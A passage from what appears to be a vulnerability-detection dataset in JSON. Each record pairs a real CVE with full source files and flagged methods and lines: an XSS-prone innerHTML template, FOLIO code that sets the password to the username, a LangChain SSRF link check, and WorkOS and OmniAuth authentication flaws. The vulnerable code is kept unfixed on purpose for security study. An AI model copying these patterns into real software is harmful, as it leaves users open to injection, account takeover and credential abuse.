          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.3,
    "cvss_version": 3.1
  },
  {
    "id": 128,
    "cve": "CVE-2024-23687",
    "description": "Hard-coded credentials in FOLIO mod-data-export-spring versions before 1.5.4 and from 2.0.0 to 2.0.2 allows unauthenticated users to access critical APIs, modify user data, modify configurations including single-sign-on, and manipulate fees/fines.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/org/folio/des/security/AuthService.java",
          "content": "package org.folio.des.security;\n\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.log4j.Log4j2;\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.folio.des.client.AuthClient;\nimport org.folio.des.client.UsersClient;\nimport org.folio.des.domain.dto.SystemUserParameters;\nimport org.folio.des.domain.dto.User;\nimport org.folio.spring.integration.XOkapiHeaders;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Optional;\n\n@Service\n@Log4j2\n@RequiredArgsConstructor\npublic class AuthService {\n\n  private final AuthClient authClient;\n  private final UsersClient usersClient;\n\n  @Value(\"${folio.system.username}\")\n  private String username;\n\n  public String getTokenForSystemUser(String tenant, String url) {\n    SystemUserParameters userParameters =\n        SystemUserParameters.builder()\n            .okapiUrl(url)\n            .tenantId(tenant)\n            .username(username)\n            .password(username)\n            .build();\n\n    log.info(\"Attempt login with url={} tenant={} username={}.\", url, tenant, username);\n\n    ResponseEntity<String> authResponse = authClient.getApiKey(userParameters);\n\n    var token = authResponse.getHeaders().get(XOkapiHeaders.TOKEN);\n    if (isNotEmpty(token)) {\n      log.info(\"Logged in as {}.\", username);\n      userParameters.setOkapiToken(token.get(0));\n    } else {\n      log.error(\"Can't get token logging in as {}.\", username);\n    }\n    return userParameters.getOkapiToken();\n  }\n\n  public String getSystemUserId() {\n    Optional<User> optionalUser = usersClient.getUsersByQuery(\"username==\" + username).getUsers().stream().findFirst();\n\n    if (optionalUser.isEmpty()) {\n      log.error(\"Can't find user id by username {}.\", username);\n      return null;\n    }\n    return optionalUser.get().getId();\n  }\n\n  private boolean isNotEmpty(java.util.List<String> token) {\n    return CollectionUtils.isNotEmpty(token) && StringUtils.isNotBlank(token.get(0));\n  }\n\n  public void saveCredentials(SystemUserParameters systemUserParameters) {\n    authClient.saveCredentials(systemUserParameters);\n\n    log.info(\"Saved credentials for user {}.\", systemUserParameters.getUsername());\n  }\n}\n"
        },
        {
          "name": "src/main/java/org/folio/des/security/SecurityManagerService.java",
          "content": "package org.folio.des.security;\n\nimport com.google.common.io.Resources;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.UUID;\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.log4j.Log4j2;\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.folio.des.client.PermissionsClient;\nimport org.folio.des.client.UsersClient;\nimport org.folio.des.domain.dto.Personal;\nimport org.folio.des.domain.dto.SystemUserParameters;\nimport org.folio.des.domain.dto.User;\nimport org.folio.des.domain.dto.permissions.Permission;\nimport org.folio.des.domain.dto.permissions.PermissionUser;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\n@Log4j2\n@RequiredArgsConstructor\npublic class SecurityManagerService {\n\n  private static final String PERMISSIONS_FILE_PATH = \"permissions/system-user-permissions.csv\";\n  private static final String USER_LAST_NAME = \"SystemDataExportS\";\n\n  private final PermissionsClient permissionsClient;\n  private final UsersClient usersClient;\n  private final AuthService authService;\n\n  @Value(\"${folio.system.username}\")\n  private String username;\n\n  public void prepareSystemUser(String okapiUrl, String tenantId) {\n    Optional<User> userOptional = getUser(username);\n\n    User user;\n    if (userOptional.isPresent()) {\n      user = userOptional.get();\n      updateUser(user);\n    } else {\n      user = createUser(username);\n      authService.saveCredentials(SystemUserParameters.builder()\n          .id(UUID.randomUUID())\n          .username(username)\n          .password(username)\n          .okapiUrl(okapiUrl)\n          .tenantId(tenantId)\n          .build());\n    }\n\n    Optional<PermissionUser> permissionUserOptional = permissionsClient.get(\"userId==\" + user.getId())\n        .getPermissionUsers()\n        .stream()\n        .findFirst();\n    if (permissionUserOptional.isPresent()) {\n      addPermissions(permissionUserOptional.get());\n    } else {\n      createPermissionUser(user.getId());\n    }\n  }\n\n  private Optional<User> getUser(String username) {\n    return usersClient.getUsersByQuery(\"username==\" + username).getUsers().stream().findFirst();\n  }\n\n  private User createUser(String username) {\n    var result = createUserObject(username);\n    log.info(\"Creating {}.\", result);\n    usersClient.saveUser(result);\n    return result;\n  }\n\n  private void updateUser(User user) {\n    if (existingUserUpToDate(user)) {\n      log.info(\"{} is up to date.\", user);\n    } else {\n      populateMissingUserProperties(user);\n      log.info(\"Updating {}.\", user);\n      usersClient.updateUser(user.getId(), user);\n    }\n  }\n\n  private PermissionUser createPermissionUser(String userId) {\n    List<String> perms = readPermissionsFromResource(PERMISSIONS_FILE_PATH);\n    if (CollectionUtils.isEmpty(perms)) {\n      throw new IllegalStateException(\"No user permissions found in \" + PERMISSIONS_FILE_PATH);\n    }\n\n    var permissionUser = PermissionUser.of(UUID.randomUUID().toString(), userId, perms);\n    log.info(\"Creating {}.\", permissionUser);\n    return permissionsClient.create(permissionUser);\n  }\n\n  private void addPermissions(PermissionUser permissionUser) {\n    var permissions = readPermissionsFromResource(PERMISSIONS_FILE_PATH);\n    if (CollectionUtils.isEmpty(permissions)) {\n      throw new IllegalStateException(\"No user permissions found in \" + PERMISSIONS_FILE_PATH);\n    }\n\n    permissions.removeAll(permissionUser.getPermissions());\n    permissions.forEach(permission -> {\n      var p = new Permission();\n      p.setPermissionName(permission);\n      try {\n        log.info(\"Adding to user {} permission {}.\", permissionUser.getUserId(), p);\n        permissionsClient.addPermission(permissionUser.getUserId(), p);\n      } catch (Exception e) {\n        log.error(String.format(\"Error adding permission %s to %s.\", permission, username), e);\n      }\n    });\n  }\n\n  private List<String> readPermissionsFromResource(String permissionsFilePath) {\n    List<String> result = new ArrayList<>();\n    var url = Resources.getResource(permissionsFilePath);\n\n    try {\n      result = Resources.readLines(url, StandardCharsets.UTF_8);\n    } catch (IOException e) {\n      log.error(String.format(\"Can't read user permissions from %s.\", permissionsFilePath), e);\n    }\n\n    return result;\n  }\n\n  private User createUserObject(String username) {\n    final var result = new User();\n\n    result.setId(UUID.randomUUID().toString());\n    result.setActive(true);\n    result.setUsername(username);\n\n    populateMissingUserProperties(result);\n\n    return result;\n  }\n\n  private boolean existingUserUpToDate(User user) {\n    return user.getPersonal() != null && StringUtils.isNotBlank(user.getPersonal().getLastName());\n  }\n\n  private User populateMissingUserProperties(User user) {\n    user.setPersonal(new Personal());\n    user.getPersonal().setLastName(USER_LAST_NAME);\n    return user;\n  }\n\n}\n"
        }
      ],
      "method_level": [
        "public String getTokenForSystemUser(String tenant, String url) {\n    SystemUserParameters userParameters =\n        SystemUserParameters.builder()\n            .okapiUrl(url)\n            .tenantId(tenant)\n            .username(username)\n            .password(username)\n            .build();\n\n    log.info(\"Attempt login with url={} tenant={} username={}.\", url, tenant, username);\n\n    ResponseEntity<String> authResponse = authClient.getApiKey(userParameters);\n\n    var token = authResponse.getHeaders().get(XOkapiHeaders.TOKEN);\n    if (isNotEmpty(token)) {\n      log.info(\"Logged in as {}.\", username);\n      userParameters.setOkapiToken(token.get(0));\n    } else {\n      log.error(\"Can't get token logging in as {}.\", username);\n    }\n    return userParameters.getOkapiToken();\n  }",
        "public void prepareSystemUser(String okapiUrl, String tenantId) {\n    Optional<User> userOptional = getUser(username);\n\n    User user;\n    if (userOptional.isPresent()) {\n      user = userOptional.get();\n      updateUser(user);\n    } else {\n      user = createUser(username);\n      authService.saveCredentials(SystemUserParameters.builder()\n          .id(UUID.randomUUID())\n          .username(username)\n          .password(username)\n          .okapiUrl(okapiUrl)\n          .tenantId(tenantId)\n          .build());\n    }\n\n    Optional<PermissionUser> permissionUserOptional = permissionsClient.get(\"userId==\" + user.getId())\n        .getPermissionUsers()\n        .stream()\n        .findFirst();\n    if (permissionUserOptional.isPresent()) {\n      addPermissions(permissionUserOptional.get());\n    } else {\n      createPermissionUser(user.getId());\n    }\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 35,
          "content": "            .password(username)"
        },
        {
          "line_no": 48,
          "content": "      authService.saveCredentials(SystemUserParameters.builder()"
        },
        {
          "line_no": 49,
          "content": "          .id(UUID.randomUUID())"
        },
        {
          "line_no": 50,
          "content": "          .username(username)"
        },
        {
          "line_no": 51,
          "content": "          .password(username)"
        },
        {
          "line_no": 52,
          "content": "          .okapiUrl(okapiUrl)"
        },
        {
          "line_no": 53,
          "content": "          .tenantId(tenantId)"
        },
        {
          "line_no": 54,
          "content": "          .build());"
        }
      ]
    },
    "cwe": [
      "CWE-798"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 345,
    "cve": "CVE-2024-0243",
    "description": "With the following crawler configuration:\n\n```python\nfrom bs4 import BeautifulSoup as Soup\n\nurl = \"https://example.com\"\nloader = RecursiveUrlLoader(\n    url=url, max_depth=2, extractor=lambda x: Soup(x, \"html.parser\").text\n)\ndocs = loader.load()\n```\n\nAn attacker in control of the contents of `https://example.com` could place a malicious HTML file in there with links like \"https://example.completely.different/my_file.html\" and the crawler would proceed to download that file as well even though `prevent_outside=True`.\n\nhttps://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51\n\nResolved in https://github.com/langchain-ai/langchain/pull/15559",
    "vulnerability": {
      "file_level": [
        {
          "name": "libs/core/langchain_core/utils/html.py",
          "content": "import re\nfrom typing import List, Optional, Sequence, Union\nfrom urllib.parse import urljoin, urlparse\n\nPREFIXES_TO_IGNORE = (\"javascript:\", \"mailto:\", \"#\")\nSUFFIXES_TO_IGNORE = (\n    \".css\",\n    \".js\",\n    \".ico\",\n    \".png\",\n    \".jpg\",\n    \".jpeg\",\n    \".gif\",\n    \".svg\",\n    \".csv\",\n    \".bz2\",\n    \".zip\",\n    \".epub\",\n)\nSUFFIXES_TO_IGNORE_REGEX = (\n    \"(?!\" + \"|\".join([re.escape(s) + r\"[\\#'\\\"]\" for s in SUFFIXES_TO_IGNORE]) + \")\"\n)\nPREFIXES_TO_IGNORE_REGEX = (\n    \"(?!\" + \"|\".join([re.escape(s) for s in PREFIXES_TO_IGNORE]) + \")\"\n)\nDEFAULT_LINK_REGEX = (\n    rf\"href=[\\\"']{PREFIXES_TO_IGNORE_REGEX}((?:{SUFFIXES_TO_IGNORE_REGEX}.)*?)[\\#'\\\"]\"\n)\n\n\ndef find_all_links(\n    raw_html: str, *, pattern: Union[str, re.Pattern, None] = None\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string.\n\n    Args:\n        raw_html: original html.\n        pattern: Regex to use for extracting links from raw html.\n\n    Returns:\n        List[str]: all links\n    \"\"\"\n    pattern = pattern or DEFAULT_LINK_REGEX\n    return list(set(re.findall(pattern, raw_html)))\n\n\ndef extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url = base_url if base_url is not None else url\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        # Some may be absolute links like https://to/path\n        if link.startswith(\"http\"):\n            absolute_paths.add(link)\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n        else:\n            absolute_paths.add(urljoin(url, link))\n    res = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n            continue\n        if prevent_outside and not path.startswith(base_url):\n            continue\n        res.append(path)\n    return res\n"
        }
      ],
      "method_level": [
        "def extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url = base_url if base_url is not None else url\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        # Some may be absolute links like https://to/path\n        if link.startswith(\"http\"):\n            absolute_paths.add(link)\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n        else:\n            absolute_paths.add(urljoin(url, link))\n    res = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n            continue\n        if prevent_outside and not path.startswith(base_url):\n            continue\n        res.append(path)\n    return res"
      ],
      "hunk_level": [
        {
          "line_no": 70,
          "content": "    base_url = base_url if base_url is not None else url"
        },
        {
          "line_no": 75,
          "content": "        if link.startswith(\"http\"):"
        },
        {
          "line_no": 76,
          "content": "            absolute_paths.add(link)"
        },
        {
          "line_no": 79,
          "content": "            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")"
        },
        {
          "line_no": 81,
          "content": "            absolute_paths.add(urljoin(url, link))"
        },
        {
          "line_no": 82,
          "content": "    res = []"
        },
        {
          "line_no": 84,
          "content": "        if any(path.startswith(exclude) for exclude in exclude_prefixes):"
        },
        {
          "line_no": 85,
          "content": "            continue"
        },
        {
          "line_no": 86,
          "content": "        if prevent_outside and not path.startswith(base_url):"
        },
        {
          "line_no": 88,
          "content": "        res.append(path)"
        },
        {
          "line_no": 89,
          "content": "    return res"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 534,
    "cve": "CVE-2024-29901",
    "description": "The AuthKit library for Next.js provides helpers for authentication and session management using WorkOS & AuthKit with Next.js.\nA user can reuse an expired session by controlling the `x-workos-session` header. The vulnerability is patched in v0.4.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/session.ts",
          "content": "import { redirect } from 'next/navigation';\nimport { cookies, headers } from 'next/headers';\nimport { NextRequest, NextResponse } from 'next/server';\nimport { jwtVerify, createRemoteJWKSet, decodeJwt } from 'jose';\nimport { sealData, unsealData } from 'iron-session';\nimport { cookieName, cookieOptions } from './cookie.js';\nimport { workos } from './workos.js';\nimport { WORKOS_CLIENT_ID, WORKOS_COOKIE_PASSWORD } from './env-variables.js';\nimport { getAuthorizationUrl } from './get-authorization-url.js';\nimport { AccessToken, NoUserInfo, Session, UserInfo } from './interfaces.js';\n\nconst sessionHeaderName = 'x-workos-session';\nconst middlewareHeaderName = 'x-workos-middleware';\n\nconst JWKS = createRemoteJWKSet(new URL(workos.userManagement.getJwksUrl(WORKOS_CLIENT_ID)));\n\nasync function encryptSession(session: Session) {\n  return sealData(session, { password: WORKOS_COOKIE_PASSWORD });\n}\n\nasync function updateSession(request: NextRequest, debug: boolean) {\n  const session = await getSessionFromCookie();\n  const newRequestHeaders = new Headers(request.headers);\n\n  // We store the current request url in a custom header, so we can always have access to it\n  // This is because on hard navigations we don't have access to `next-url` but need to get the current\n  // `pathname` to be able to return the users where they came from before sign-in\n  newRequestHeaders.set('x-url', request.url);\n\n  // Record that the request was routed through the middleware so we can check later for DX purposes\n  newRequestHeaders.set(middlewareHeaderName, 'true');\n\n  // If no session, just continue\n  if (!session) {\n    return NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n  }\n\n  const hasValidSession = await verifyAccessToken(session.accessToken);\n\n  if (hasValidSession) {\n    if (debug) console.log('Session is valid');\n    // set the x-workos-session header according to the current cookie value\n    newRequestHeaders.set(sessionHeaderName, cookies().get(cookieName)!.value);\n    return NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n  }\n\n  try {\n    if (debug) console.log('Session invalid. Attempting refresh', session.refreshToken);\n\n    // If the session is invalid (i.e. the access token has expired) attempt to re-authenticate with the refresh token\n    const { accessToken, refreshToken } = await workos.userManagement.authenticateWithRefreshToken({\n      clientId: WORKOS_CLIENT_ID,\n      refreshToken: session.refreshToken,\n    });\n\n    if (debug) console.log('Refresh successful:', refreshToken);\n\n    // Encrypt session with new access and refresh tokens\n    const encryptedSession = await encryptSession({\n      accessToken,\n      refreshToken,\n      user: session.user,\n      impersonator: session.impersonator,\n    });\n\n    newRequestHeaders.set(sessionHeaderName, encryptedSession);\n\n    const response = NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n    // update the cookie\n    response.cookies.set(cookieName, encryptedSession, cookieOptions);\n    return response;\n  } catch (e) {\n    console.warn('Failed to refresh', e);\n    const response = NextResponse.next();\n    response.cookies.delete(cookieName);\n    return response;\n  }\n}\n\nasync function getUser(options?: { ensureSignedIn: false }): Promise<UserInfo | NoUserInfo>;\n\nasync function getUser(options: { ensureSignedIn: true }): Promise<UserInfo>;\n\nasync function getUser({ ensureSignedIn = false } = {}) {\n  const hasMiddleware = Boolean(headers().get(middlewareHeaderName));\n\n  if (!hasMiddleware) {\n    throw new Error(\n      'You are calling `getUser` on a path that isn’t covered by the AuthKit middleware. Make sure it is running on all paths you are calling `getUser` from by updating your middleware config in `middleware.(js|ts)`.',\n    );\n  }\n\n  const session = await getSessionFromHeader();\n  if (!session) {\n    if (ensureSignedIn) {\n      const url = headers().get('x-url');\n      const returnPathname = url ? new URL(url).pathname : undefined;\n      redirect(await getAuthorizationUrl(returnPathname));\n    }\n    return { user: null };\n  }\n\n  const { sid: sessionId, org_id: organizationId, role } = decodeJwt<AccessToken>(session.accessToken);\n\n  return {\n    sessionId,\n    user: session.user,\n    organizationId,\n    role,\n    impersonator: session.impersonator,\n  };\n}\n\nasync function terminateSession() {\n  const { sessionId } = await getUser();\n  if (sessionId) {\n    redirect(workos.userManagement.getLogoutUrl({ sessionId }));\n  }\n  redirect('/');\n}\n\nasync function verifyAccessToken(accessToken: string) {\n  try {\n    await jwtVerify(accessToken, JWKS);\n    return true;\n  } catch (e) {\n    console.warn('Failed to verify session:', e);\n    return false;\n  }\n}\n\nasync function getSessionFromCookie() {\n  const cookie = cookies().get(cookieName);\n  if (cookie) {\n    return unsealData<Session>(cookie.value, {\n      password: WORKOS_COOKIE_PASSWORD,\n    });\n  }\n}\n\nasync function getSessionFromHeader(): Promise<Session | undefined> {\n  const authHeader = headers().get(sessionHeaderName);\n  if (!authHeader) return;\n\n  return unsealData<Session>(authHeader, { password: WORKOS_COOKIE_PASSWORD });\n}\n\nexport { encryptSession, updateSession, getUser, terminateSession };\n"
        }
      ],
      "method_level": [
        "updateSession"
      ],
      "hunk_level": [
        {
          "line_no": 80,
          "content": "    const response = NextResponse.next();"
        }
      ]
    },
    "cwe": [
      "CWE-294"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 5,
    "cve": "CVE-2024-21632",
    "description": "omniauth-microsoft_graph provides an Omniauth strategy for the Microsoft Graph API. Prior to versions 2.0.0, the implementation did not validate the legitimacy of the `email` attribute of the user nor did it give/document an option to do so, making it susceptible to nOAuth misconfiguration in cases when the `email` is used as a trusted user identifier. This could lead to account takeover. Version 2.0.0 contains a fix for this issue.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/omniauth/strategies/microsoft_graph.rb",
          "content": "require 'omniauth-oauth2'\n\nmodule OmniAuth\n  module Strategies\n    class MicrosoftGraph < OmniAuth::Strategies::OAuth2\n      BASE_SCOPE_URL = 'https://graph.microsoft.com/'\n      BASE_SCOPES = %w[offline_access openid email profile].freeze\n      DEFAULT_SCOPE = 'offline_access openid email profile User.Read'.freeze\n\n      option :name, :microsoft_graph\n\n      option :client_options, {\n        site:          'https://login.microsoftonline.com/',\n        token_url:     'common/oauth2/v2.0/token',\n        authorize_url: 'common/oauth2/v2.0/authorize'\n      }\n\n      option :authorize_options, %i[state callback_url access_type display score auth_type scope prompt login_hint domain_hint response_mode]\n\n      option :token_params, {\n      }\n\n      option :scope, DEFAULT_SCOPE\n      option :authorized_client_ids, []\n\n      uid { raw_info[\"id\"] }\n\n      info do\n        {\n          'email' => raw_info[\"mail\"],\n          'first_name' => raw_info[\"givenName\"],\n          'last_name' => raw_info[\"surname\"],\n          'name' => [raw_info[\"givenName\"], raw_info[\"surname\"]].join(' '),\n          'nickname' => raw_info[\"displayName\"],\n        }\n      end\n\n      extra do\n        {\n          'raw_info' => raw_info,\n          'params' => access_token.params,\n          'aud' => options.client_id\n        }\n      end\n\n      def authorize_params\n        super.tap do |params|\n          options[:authorize_options].each do |k|\n            params[k] = request.params[k.to_s] unless [nil, ''].include?(request.params[k.to_s])\n          end\n\n          params[:scope] = get_scope(params)\n          params[:access_type] = 'offline' if params[:access_type].nil?\n\n          session['omniauth.state'] = params[:state] if params[:state]\n        end\n      end     \n\n      def raw_info\n        @raw_info ||= access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n      end\n\n      def callback_url\n        options[:callback_url] || full_host + script_name + callback_path\n      end  \n\n      def custom_build_access_token\n        access_token = get_access_token(request)\n        access_token\n      end\n\n      alias build_access_token custom_build_access_token\n\n      private\n\n      def get_access_token(request)\n        verifier = request.params['code']\n        redirect_uri = request.params['redirect_uri'] || request.params['callback_url']\n        if verifier && request.xhr?\n          client_get_token(verifier, redirect_uri || '/auth/microsoft_graph/callback')\n        elsif verifier\n          client_get_token(verifier, redirect_uri || callback_url)\n        elsif verify_token(request.params['access_token'])\n          ::OAuth2::AccessToken.from_hash(client, request.params.dup)\n        elsif request.content_type =~ /json/i\n          begin\n            body = JSON.parse(request.body.read)\n            request.body.rewind # rewind request body for downstream middlewares\n            verifier = body && body['code']\n            client_get_token(verifier, '/auth/microsoft_graph/callback') if verifier\n          rescue JSON::ParserError => e\n            warn \"[omniauth microsoft_graph] JSON parse error=#{e}\"\n          end\n        end\n      end\n\n      def client_get_token(verifier, redirect_uri)\n        client.auth_code.get_token(verifier, get_token_options(redirect_uri), get_token_params)\n      end\n\n      def get_token_params\n        deep_symbolize(options.auth_token_params || {})\n      end\n\n      def get_token_options(redirect_uri = '')\n        { redirect_uri: redirect_uri }.merge(token_params.to_hash(symbolize_keys: true))\n      end\n\n      def get_scope(params)\n        raw_scope = params[:scope] || DEFAULT_SCOPE\n        scope_list = raw_scope.split(' ').map { |item| item.split(',') }.flatten\n        scope_list.map! { |s| s =~ %r{^https?://} || BASE_SCOPES.include?(s) ? s : \"#{BASE_SCOPE_URL}#{s}\" }\n        scope_list.join(' ')\n      end\n\n      def verify_token(access_token)\n        return false unless access_token\n        # access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n        raw_response = client.request(:get, 'https://graph.microsoft.com/v1.0/me',\n                                      params: { access_token: access_token }).parsed\n        (raw_response['aud'] == options.client_id) || options.authorized_client_ids.include?(raw_response['aud'])\n      end              \n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def authorize_params\n        super.tap do |params|\n          options[:authorize_options].each do |k|\n            params[k] = request.params[k.to_s] unless [nil, ''].include?(request.params[k.to_s])\n          end\n\n          params[:scope] = get_scope(params)\n          params[:access_type] = 'offline' if params[:access_type].nil?\n\n          session['omniauth.state'] = params[:state] if params[:state]\n        end\n      end",
        "def callback_url\n        options[:callback_url] || full_host + script_name + callback_path\n      end",
        "def verify_token(access_token)\n        return false unless access_token\n        # access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n        raw_response = client.request(:get, 'https://graph.microsoft.com/v1.0/me',\n                                      params: { access_token: access_token }).parsed\n        (raw_response['aud'] == options.client_id) || options.authorized_client_ids.include?(raw_response['aud'])\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "      end     "
        },
        {
          "line_no": 65,
          "content": "      end  "
        },
        {
          "line_no": 122,
          "content": "      end              "
        }
      ]
    },
    "cwe": [
      "CWE-287"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 3.1
  },
  {
    "id": 36,
    "cve": "CVE-2025-24893",
